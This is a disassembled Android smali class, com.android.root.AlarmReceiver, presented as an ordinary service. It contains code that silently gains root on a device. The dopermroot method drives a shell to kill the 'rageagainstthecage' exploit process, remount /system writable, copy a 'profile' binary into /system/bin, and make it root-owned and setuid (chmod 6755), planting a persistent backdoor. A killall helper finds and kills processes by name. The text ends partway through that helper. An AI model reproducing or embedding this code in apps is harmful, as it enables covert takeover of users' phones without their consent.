.class public Lcom/android/root/AlarmReceiver;
.super Landroid/app/Service;
.source "AlarmReceiver.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 22
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$0(Lcom/android/root/AlarmReceiver;)V
    .locals 0
    .parameter

    .prologue
    .line 36
    invoke-direct {p0}, Lcom/android/root/AlarmReceiver;->destroyService()V

    return-void
.end method

.method private destroyService()V
    .locals 0

    .prologue
    .line 37
    invoke-virtual {p0}, Lcom/android/root/AlarmReceiver;->stopSelf()V

    .line 38
    return-void
.end method


# virtual methods
.method public dopermroot(Landroid/content/Context;)V
    .locals 9
    .parameter "ctx"

    .prologue
    .line 103
    const/4 v6, 0x1

    new-array v5, v6, [I

    .line 104
    .local v5, processId:[I
    const-string v6, "/system/bin/sh"

    const-string v7, "-"

    const/4 v8, 0x0

    invoke-static {v6, v7, v8, v5}, Ljackpal/androidterm/Exec;->createSubprocess(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;[I)Ljava/io/FileDescriptor;

    move-result-object v2

    .line 107
    .local v2, fd:Ljava/io/FileDescriptor;
    new-instance v4, Ljava/io/FileOutputStream;

    invoke-direct {v4, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/FileDescriptor;)V

    .line 108
    .local v4, out:Ljava/io/FileOutputStream;
    new-instance v3, Ljava/io/FileInputStream;

    invoke-direct {v3, v2}, Ljava/io/FileInputStream;-><init>(Ljava/io/FileDescriptor;)V

    .line 111
    .local v3, in:Ljava/io/FileInputStream;
    new-instance v6, Lcom/android/root/AlarmReceiver$1;

    invoke-direct {v6, p0, v3}, Lcom/android/root/AlarmReceiver$1;-><init>(Lcom/android/root/AlarmReceiver;Ljava/io/FileInputStream;)V

    .line 134
    invoke-virtual {v6}, Lcom/android/root/AlarmReceiver$1;->start()V

    .line 137
    :try_start_0
    const-string v0, "id\n"

    .line 138
    .local v0, command:Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/io/FileOutputStream;->write([B)V

    .line 139
    invoke-virtual {v4}, Ljava/io/FileOutputStream;->flush()V

    .line 144
    const-string v6, "rageagainstthecage"

    invoke-virtual {p0, v4, v6}, Lcom/android/root/AlarmReceiver;->killall(Ljava/io/FileOutputStream;Ljava/lang/String;)V

    .line 149
    const-string v0, "mount -o remount rw /system\n"

    .line 150
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/io/FileOutputStream;->write([B)V

    .line 151
    invoke-virtual {v4}, Ljava/io/FileOutputStream;->flush()V

    .line 152
    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "cat "

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "/profile > /system/bin/profile\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 153
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/io/FileOutputStream;->write([B)V

    .line 154
    invoke-virtual {v4}, Ljava/io/FileOutputStream;->flush()V

    .line 164
    const-string v0, "chown 0.0 /system/bin/profile\n"

    .line 165
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/io/FileOutputStream;->write([B)V

    .line 166
    invoke-virtual {v4}, Ljava/io/FileOutputStream;->flush()V

    .line 167
    const-string v0, "chown root.root /system/bin/profile\n"

    .line 168
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/io/FileOutputStream;->write([B)V

    .line 169
    invoke-virtual {v4}, Ljava/io/FileOutputStream;->flush()V

    .line 170
    const-string v0, "chmod 6755 /system/bin/profile\n"

    .line 171
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/io/FileOutputStream;->write([B)V

    .line 172
    invoke-virtual {v4}, Ljava/io/FileOutputStream;->flush()V

    .line 190
    const-string v6, "checkvar=checked"

    invoke-virtual {p0, v4, v6}, Lcom/android/root/AlarmReceiver;->write(Ljava/io/FileOutputStream;Ljava/lang/String;)V

    .line 191
    const-string v6, "echo finished $checkvar"

    invoke-virtual {p0, v4, v6}, Lcom/android/root/AlarmReceiver;->write(Ljava/io/FileOutputStream;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 206
    .end local v0           #command:Ljava/lang/String;
    :goto_0
    return-void

    .line 203
    :catch_0
    move-exception v6

    move-object v1, v6

    .line 204
    .local v1, ex:Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public killall(Ljava/io/FileOutputStream;Ljava/lang/String;)V
    .locals 13
    .parameter "out"
    .parameter "procName"

    .prologue
    .line 221
    :try_start_0
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "ps > "

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/android/root/AlarmReceiver;->getFilesDir()Ljava/io/File;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "/proc"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "\n"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 222
    .local v0, cmd:Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v10

    invoke-virtual {p1, v10}, Ljava/io/FileOutputStream;->write([B)V

    .line 223
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->flush()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 230
    const-wide/16 v10, 0x3e8

    :try_start_1
    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V

    .line 231
    new-instance v2, Ljava/io/File;

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Lcom/android/root/AlarmReceiver;->getFilesDir()Ljava/io/File;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "/proc"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v2, v10}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 232
    .local v2, f:Ljava/io/File;
    new-instance v3, Ljava/io/FileInputStream;

    invoke-direct {v3, v2}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_6

    .line 234
    .local v3, fis:Ljava/io/FileInputStream;
    const/4 v7, 0x0

    .line 236
    .local v7, reader:Ljava/io/BufferedReader;
    :try_start_2
    new-instance v8, Ljava/io/BufferedReader;

    new-instance v10, Ljava/io/InputStreamReader;

    invoke-direct {v10, v3}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-virtual {v3}, Ljava/io/FileInputStream;->available()I

    move-result v11

    invoke-direct {v8, v10, v11}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;I)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_3
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_7

    .line 239
    .end local v7           #reader:Ljava/io/BufferedReader;
    .local v8, reader:Ljava/io/BufferedReader;
    const/4 v6, 0x1

    .line 240
    .local v6, pidIndex:I
    :cond_0
    :goto_0
    :try_start_3
    invoke-virtual {v8}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_4
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_5

    move-result-object v5

    .local v5, line:Ljava/lang/String;
    if-nez v5, :cond_14

    .line 262
    if-eqz v8, :cond_1

    .line 263
    :try_start_4
    invoke-virtual {v8}, Ljava/io/BufferedReader;->close()V

    .line 266
    :cond_1
    if-eqz v3, :cond_2

    .line 267
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_6

    .line 279
    .end local v0           #cmd:Ljava/lang/String;
    .end local v2           #f:Ljava/io/File;
    .end local v3           #fis:Ljava/io/FileInputStream;
    .end local v5           #line:Ljava/lang/String;
    .end local v6           #pidIndex:I
    .end local v8           #reader:Ljava/io/BufferedReader;
    :cond_2
    :goto_1
    return-void

    .line 225
    :catch_0
    move-exception v10

    .line 230
    const-wide/16 v10, 0x3e8

    :try_start_5
    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V

    .line 231
    new-instance v2, Ljava/io/File;

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Lcom/android/root/AlarmReceiver;->getFilesDir()Ljava/io/File;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "/proc"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v2, v10}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 232
    .restart local v2       #f:Ljava/io/File;
    new-instance v3, Ljava/io/FileInputStream;

    invoke-direct {v3, v2}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    .line 234
    .restart local v3       #fis:Ljava/io/FileInputStream;
    const/4 v7, 0x0

    .line 236
    .restart local v7       #reader:Ljava/io/BufferedReader;
    :try_start_6
    new-instance v8, Ljava/io/BufferedReader;

    new-instance v10, Ljava/io/InputStreamReader;

    invoke-direct {v10, v3}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-virtual {v3}, Ljava/io/FileInputStream;->available()I

    move-result v11

    invoke-direct {v8, v10, v11}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;I)V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_0
    .catch Ljava/io/IOException; {:try_start_6 .. :try_end_6} :catch_9

    .line 239
    .end local v7           #reader:Ljava/io/BufferedReader;
    .restart local v8       #reader:Ljava/io/BufferedReader;
    const/4 v6, 0x1

    .line 240
    .restart local v6       #pidIndex:I
    :cond_3
    :goto_2
    :try_start_7
    invoke-virtual {v8}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_6
    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_7} :catch_2

    move-result-object v5

    .restart local v5       #line:Ljava/lang/String;
    if-nez v5, :cond_5

    .line 262
    if-eqz v8, :cond_4

    .line 263
    :try_start_8
    invoke-virtual {v8}, Ljava/io/BufferedReader;->close()V

    .line 266
    :cond_4
    if-eqz v3, :cond_2

    .line 267
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_1

    goto :goto_1

    .line 274
    .end local v2           #f:Ljava/io/File;
    .end local v3           #fis:Ljava/io/FileInputStream;
    .end local v5           #line:Ljava/lang/String;
    .end local v6           #pidIndex:I
    .end local v8           #reader:Ljava/io/BufferedReader;
    :catch_1
    move-exception v10

    goto :goto_1

    .line 242
    .restart local v2       #f:Ljava/io/File;
    .restart local v3       #fis:Ljava/io/FileInputStream;
    .restart local v5       #line:Ljava/lang/String;
    .restart local v6       #pidIndex:I
    .restart local v8       #reader:Ljava/io/BufferedReader;
    :cond_5
    :try_start_9
    const-string v10, "PID"

    invoke-virtual {v5, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_7

    const-string v10, "PPID"

    invoke-virtual {v5, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_7

    .line 243
    const-string v10, "\\s+"

    invoke-virtual {v5, v10}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    .line 244
    .local v9, tmp:[Ljava/lang/String;
    const/4 v4, 0x0

    .local v4, i:I
    :goto_3
    array-length v10, v9

    if-ge v4, v10, :cond_3

    .line 245
    aget-object v10, v9, v4

    const-string v11, "PID"

    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_6

    .line 246
    move v6, v4

    .line 247
    goto :goto_2

    .line 244
    :cond_6
    add-int/lit8 v4, v4, 0x1

    goto :goto_3

    .line 251
    .end local v4           #i:I
    .end local v9           #tmp:[Ljava/lang/String;
    :cond_7
    const-string v10, "\\s+"

    invoke-virtual {v5, v10}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    .line 252
    .restart local v9       #tmp:[Ljava/lang/String;
    array-length v10, v9

    const/4 v11, 0x1

    sub-int/2addr v10, v11

    aget-object v10, v9, v10

    invoke-virtual {v10, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_3

    .line 253
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "kill -9 "

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v11, v9, v6

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "\n"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 254
    .restart local v0       #cmd:Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v10

    invoke-virtual {p1, v10}, Ljava/io/FileOutputStream;->write([B)V

    .line 255
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->flush()V
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_6
    .catch Ljava/io/IOException; {:try_start_9 .. :try_end_9} :catch_2

    goto :goto_2

    .line 259
    .end local v0           #cmd:Ljava/lang/String;
    .end local v5           #line:Ljava/lang/String;
    .end local v9           #tmp:[Ljava/lang/String;
    :catch_2
    move-exception v10

    move-object v1, v10

    move-object v7, v8

    .line 260
    .end local v6           #pidIndex:I
    .end local v8           #reader:Ljava/io/BufferedReader;
    .local v1, e:Ljava/io/IOException;
    .restart local v7       #reader:Ljava/io/BufferedReader;
    :goto_4
    :try_start_a
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_0

    .line 262
    if-eqz v7, :cond_8

    .line 263
    :try_start_b
    invoke-virtual {v7}, Ljava/io/BufferedReader;->close()V

    .line 266
    :cond_8
    if-eqz v3, :cond_2

    .line 267
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V

    goto/16 :goto_1

    .line 261
    .end local v1           #e:Ljava/io/IOException;
    :catchall_0
    move-exception v10

    .line 262
    :goto_5
    if-eqz v7, :cond_9

    .line 263
    invoke-virtual {v7}, Ljava/io/BufferedReader;->close()V

    .line 266
    :cond_9
    if-eqz v3, :cond_a

    .line 267
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V

    .line 270
    :cond_a
    throw v10
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_1

    .line 227
    .end local v2           #f:Ljava/io/File;
    .end local v3           #fis:Ljava/io/FileInputStream;
    .end local v7           #reader:Ljava/io/BufferedReader;
    :catchall_1
    move-exception v10

    .line 230
    const-wide/16 v11, 0x3e8

    :try_start_c
    invoke-static {v11, v12}, Ljava/lang/Thread;->sleep(J)V

    .line 231
    new-instance v2, Ljava/io/File;

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Lcom/android/root/AlarmReceiver;->getFilesDir()Ljava/io/File;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "/proc"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-direct {v2, v11}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 232
    .restart local v2       #f:Ljava/io/File;
    new-instance v3, Ljava/io/FileInputStream;

    invoke-direct {v3, v2}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_4

    .line 234
    .restart local v3       #fis:Ljava/io/FileInputStream;
    const/4 v7, 0x0

    .line 236
    .restart local v7       #reader:Ljava/io/BufferedReader;
    :try_start_d
    new-instance v8, Ljava/io/BufferedReader;

    new-instance v11, Ljava/io/InputStreamReader;

    invoke-direct {v11, v3}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-virtual {v3}, Ljava/io/FileInputStream;->available()I

    move-result v12

    invoke-direct {v8, v11, v12}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;I)V
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_2
    .catch Ljava/io/IOException; {:try_start_d .. :try_end_d} :catch_8

    .line 239
    .end local v7           #reader:Ljava/io/BufferedReader;
    .restart local v8       #reader:Ljava/io/BufferedReader;
    const/4 v6, 0x1

    .line 240
    .restart local v6       #pidIndex:I
    :cond_b
    :goto_6
    :try_start_e
    invoke-virtual {v8}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_e
    .catchall {:try_start_e .. :try_end_e} :catchall_5
    .catch Ljava/io/IOException; {:try_start_e .. :try_end_e} :catch_3

    move-result-object v5

    .restart local v5       #line:Ljava/lang/String;
    if-nez v5, :cond_e

    .line 262
    if-eqz v8, :cond_c

    .line 263
    :try_start_f
    invoke-virtual {v8}, Ljava/io/BufferedReader;->close()V

    .line 266
    :cond_c
    if-eqz v3, :cond_d

    .line 267
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_4

    .line 277
    .end local v2           #f:Ljava/io/File;
    .end local v3           #fis:Ljava/io/FileInputStream;
    .end local v5           #line:Ljava/lang/String;
    .end local v6           #pidIndex:I
    .end local v8           #reader:Ljava/io/BufferedReader;
    :cond_d
    :goto_7
    throw v10

    .line 242
    .restart local v2       #f:Ljava/io/File;
    .restart local v3       #fis:Ljava/io/FileInputStream;
    .restart local v5       #line:Ljava/lang/String;
    .restart local v6       #pidIndex:I
    .restart local v8       #reader:Ljava/io/BufferedReader;
    :cond_e
    :try_start_10
    const-string v11, "PID"

    invoke-virtual {v5, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_10

    const-string v11, "PPID"

    invoke-virtual {v5, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_10

    .line 243
    const-string v11, "\\s+"

    invoke-virtual {v5, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    .line 244
    .restart local v9       #tmp:[Ljava/lang/String;
    const/4 v4, 0x0

    .restart local v4       #i:I
    :goto_8
    array-length v11, v9

    if-ge v4, v11, :cond_b

    .line 245
    aget-object v11, v9, v4

    const-string v12, "PID"

    invoke-virtual {v11, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_f

    .line 246
    move v6, v4

    .line 247
    goto :goto_6

    .line 244
    :cond_f
    add-int/lit8 v4, v4, 0x1

    goto :goto_8

    .line 251
    .end local v4           #i:I
    .end local v9           #tmp:[Ljava/lang/String;
    :cond_10
    const-string v11, "\\s+"

    invoke-virtual {v5, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    .line 252
    .restart local v9       #tmp:[Ljava/lang/String;
    array-length v11, v9

    const/4 v12, 0x1

    sub-int/2addr v11, v12

    aget-object v11, v9, v11

    invoke-virtual {v11, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_b

    .line 253
    new-instance v11, Ljava/lang/StringBuilder;

    const-string v12, "kill -9 "

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v12, v9, v6

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "\n"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 254
    .restart local v0       #cmd:Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v11

    invoke-virtual {p1, v11}, Ljava/io/FileOutputStream;->write([B)V

    .line 255
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->flush()V
    :try_end_10
    .catchall {:try_start_10 .. :try_end_10} :catchall_5
    .catch Ljava/io/IOException; {:try_start_10 .. :try_end_10} :catch_3

    goto :goto_6

    .line 259
    .end local v0           #cmd:Ljava/lang/String;
    .end local v5           #line:Ljava/lang/String;
    .end local v9           #tmp:[Ljava/lang/String;
    :catch_3
    move-exception v11

    move-object v1, v11

    move-object v7, v8

    .line 260
    .end local v6           #pidIndex:I
    .end local v8           #reader:Ljava/io/BufferedReader;
    .restart local v1       #e:Ljava/io/IOException;
    .restart local v7       #reader:Ljava/io/BufferedReader;
    :goto_9
    :try_start_11
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V
    :try_end_11
    .catchall {:try_start_11 .. :try_end_11} :catchall_2

    .line 262
    if-eqz v7, :cond_11

    .line 263
    :try_start_12
    invoke-virtual {v7}, Ljava/io/BufferedReader;->close()V

    .line 266
    :cond_11
    if-eqz v3, :cond_d

    .line 267
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V

    goto :goto_7

    .line 274
    .end local v1           #e:Ljava/io/IOException;
    .end local v2           #f:Ljava/io/File;
    .end local v3           #fis:Ljava/io/FileInputStream;
    .end local v7           #reader:Ljava/io/BufferedReader;
    :catch_4
    move-exception v11

    goto :goto_7

    .line 261
    .restart local v2       #f:Ljava/io/File;
    .restart local v3       #fis:Ljava/io/FileInputStream;
    .restart local v7       #reader:Ljava/io/BufferedReader;
    :catchall_2
    move-exception v11

    .line 262
    :goto_a
    if-eqz v7, :cond_12

    .line 263
    invoke-virtual {v7}, Ljava/io/BufferedReader;->close()V

    .line 266
    :cond_12
    if-eqz v3, :cond_13

    .line 267
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V

    .line 270
    :cond_13
    throw v11
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_4

    .line 242
    .end local v7           #reader:Ljava/io/BufferedReader;
    .restart local v0       #cmd:Ljava/lang/String;
    .restart local v5       #line:Ljava/lang/String;
    .restart local v6       #pidIndex:I
    .restart local v8       #reader:Ljava/io/BufferedReader;
    :cond_14
    :try_start_13
    const-string v10, "PID"

    invoke-virtual {v5, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_16

    const-string v10, "PPID"

    invoke-virtual {v5, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_16

    .line 243
    const-string v10, "\\s+"

    invoke-virtual {v5, v10}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    .line 244
    .restart local v9       #tmp:[Ljava/lang/String;
    const/4 v4, 0x0

    .restart local v4       #i:I
    :goto_b
    array-length v10, v9

    if-ge v4, v10, :cond_0

    .line 245
    aget-object v10, v9, v4

    const-string v11, "PID"

    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_15

    .line 246
    move v6, v4

    .line 247
    goto/16 :goto_0

    .line 244
    :cond_15
    add-int/lit8 v4, v4, 0x1

    goto :goto_b

    .line 251
    .end local v4           #i:I
    .end local v9           #tmp:[Ljava/lang/String;
    :cond_16
    const-string v10, "\\s+"

    invoke-virtual {v5, v10}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    .line 252
    .restart local v9       #tmp:[Ljava/lang/String;
    array-length v10, v9

    const/4 v11, 0x1

    sub-int/2addr v10, v11

    aget-object v10, v9, v10

    invoke-virtual {v10, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_0

    .line 253
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "kill -9 "

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v11, v9, v6

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "\n"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 254
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v10

    invoke-virtual {p1, v10}, Ljava/io/FileOutputStream;->write([B)V

    .line 255
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->flush()V
    :try_end_13
    .catchall {:try_start_13 .. :try_end_13} :catchall_4
    .catch Ljava/io/IOException; {:try_start_13 .. :try_end_13} :catch_5

    goto/16 :goto_0

    .line 259
    .end local v5           #line:Ljava/lang/String;
    .end local v9           #tmp:[Ljava/lang/String;
    :catch_5
    move-exception v10

    move-object v1, v10

    move-object v7, v8

    .line 260
    .end local v6           #pidIndex:I
    .end local v8           #reader:Ljava/io/BufferedReader;
    .restart local v1       #e:Ljava/io/IOException;
    .restart local v7       #reader:Ljava/io/BufferedReader;
    :goto_c
    :try_start_14
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V
    :try_end_14
    .catchall {:try_start_14 .. :try_end_14} :catchall_3

    .line 262
    if-eqz v7, :cond_17

    .line 263
    :try_start_15
    invoke-virtual {v7}, Ljava/io/BufferedReader;->close()V

    .line 266
    :cond_17
    if-eqz v3, :cond_2

    .line 267
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V

    goto/16 :goto_1

    .line 274
    .end local v1           #e:Ljava/io/IOException;
    .end local v2           #f:Ljava/io/File;
    .end local v3           #fis:Ljava/io/FileInputStream;
    .end local v7           #reader:Ljava/io/BufferedReader;
    :catch_6
    move-exception v10

    goto/16 :goto_1

    .line 261
    .restart local v2       #f:Ljava/io/File;
    .restart local v3       #fis:Ljava/io/FileInputStream;
    .restart local v7       #reader:Ljava/io/BufferedReader;
    :catchall_3
    move-exception v10

    .line 262
    :goto_d
    if-eqz v7, :cond_18

    .line 263
    invoke-virtual {v7}, Ljava/io/BufferedReader;->close()V

    .line 266
    :cond_18
    if-eqz v3, :cond_19

    .line 267
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V

    .line 270
    :cond_19
    throw v10
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_6

    .line 261
    .end local v7           #reader:Ljava/io/BufferedReader;
    .restart local v6       #pidIndex:I
    .restart local v8       #reader:Ljava/io/BufferedReader;
